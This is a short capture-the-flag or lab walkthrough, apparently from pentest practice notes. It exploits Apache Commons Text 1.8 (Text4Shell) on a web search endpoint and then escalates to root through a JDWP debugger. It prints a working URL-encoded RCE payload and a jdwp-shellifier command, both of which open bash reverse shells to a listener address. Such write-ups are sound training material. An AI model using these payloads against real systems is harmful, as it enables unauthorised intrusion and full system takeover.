# Take Away
- If a RCE payload does not work, google for available alternatives.
# Exploitation
- Directory Brute Forcing will reveal two potentially interesting URLs. One is `/search` and the other is `/CHANGELOG`.
- Upon visiting the `/CHANGELOG`, one can identify that `Apache Commons Text 1.8` has recently been incorporated into the search functionality which is potentially the `/search` URL.![[Pasted image 20240217104817.png]]
- A little googling will identify that `Apache Commons Text 1.8` is vulnerable to a `RCE`.
	- https://github.com/kljunowsky/CVE-2022-42889-text4shell
- Set up listener and run `curl http://192.168.226.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27bash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.229%2F443%200%3E%261%27%29%7D%0A` to get a reverse shell call back.
# PrivEsc
- `linpeas` will identify Java Debugger is using `jdwp` under root privilege.![[Pasted image 20240217123103.png]]
	- https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol
- Download and transfer `jdwp-shellifier` onto the target syste
	- https://github.com/hugsy/jdwp-shellifier
- Open a `netcat` listener and run `python3 jdwp-shellifier.py -t 127.0.0.1 -p 8000 -c "bash -c \$@|bash 0 echo bash -i >& /dev/tcp/192.168.45.229/443 0>&1"`. Finally, in another session, run `nc 127.0.0.1 5000 -z` to trigger the RCE and obtain a root shell.